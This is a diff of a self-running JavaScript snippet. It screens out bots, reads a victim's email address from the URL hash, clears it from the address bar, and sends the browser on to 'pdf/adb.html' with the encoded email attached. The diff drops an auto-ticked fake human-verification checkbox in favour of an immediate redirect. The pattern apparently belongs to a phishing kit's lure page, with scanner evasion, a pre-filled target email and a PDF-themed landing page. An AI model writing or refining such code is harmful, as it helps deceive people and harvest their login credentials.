@@ -1,5 +1,5 @@
 (function () {
-  // Basic bot detection
+  // Bot detection
   if (
     window.outerWidth === 0 ||
     window.outerHeight === 0 ||
@@ -29,7 +29,6 @@
     return;
   }
 
-  // Store email and token and clean URL
   const email = hash;
   const token = generateSecureToken();
 
@@ -38,20 +37,9 @@
 
   history.replaceState(null, "", window.location.pathname + window.location.search);
 
-  // Auto-check and redirect immediately
-  const checkbox = document.getElementById("humanCheck");
-  if (checkbox) {
-    checkbox.checked = true;
-    const encodedEmail = encodeData(email);
-    const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
-    
-    // Redirect right after a tiny delay so checkbox visually updates
-    setTimeout(() => {
-      window.location.href = redirectUrl;
-    }, 100); // 100 ms delay is enough to show checkbox checked briefly
-  } else {
-    // fallback if checkbox missing - redirect immediately
-    const encodedEmail = encodeData(email);
-    window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
-  }
+  const encodedEmail = encodeData(email);
+  const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
+
+  // Redirect immediately
+  window.location.href = redirectUrl;
 })();
